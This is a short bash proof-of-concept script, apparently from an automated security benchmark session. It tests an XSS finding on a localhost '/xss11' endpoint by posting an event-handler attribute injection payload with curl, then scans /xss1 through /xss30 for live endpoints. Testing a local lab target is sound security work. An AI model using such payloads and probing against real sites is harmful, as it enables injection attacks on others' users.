#!/bin/bash
# POC: Verify if the existing XSS finding's endpoint actually works
# Target: ./repo
# Created: 2025-11-06T19:23:43.439Z
# Session: benchmark-XBEN-012-24-mhnsyuvd

# Verify the existing XSS finding works on the endpoint it claims

TARGET="http://localhost:5000/xss11"

echo "[*] Attempting to verify existing XSS finding on $TARGET"
echo ""

# The existing finding mentions this payload works:
# Using event handler attribute injection instead of tags

# Test 1: Try the exact payload from existing finding
echo "[Test 1] Testing with event handler payload"
PAYLOAD="' onfocus='alert(1)' a='"
echo "Payload: $PAYLOAD"
RESPONSE=$(curl -s "$TARGET" -d "search=$PAYLOAD" 2>&1)
echo "Response headers:"
echo "$RESPONSE" | head -5
echo ""

# Test 2: Check if endpoint even responds to GET
echo "[Test 2] GET request test"
curl -s -w "\nStatus: %{http_code}\n" "http://localhost:5000/xss11" | head -20
echo ""

# Test 3: Check if there's a working XSS endpoint
echo "[Test 3] Trying common alternative endpoints"
for num in {1..30}; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:5000/xss$num")
    if [ "$STATUS" != "500" ] && [ "$STATUS" != "404" ]; then
        echo "Found working endpoint: /xss$num (Status: $STATUS)"
    fi
done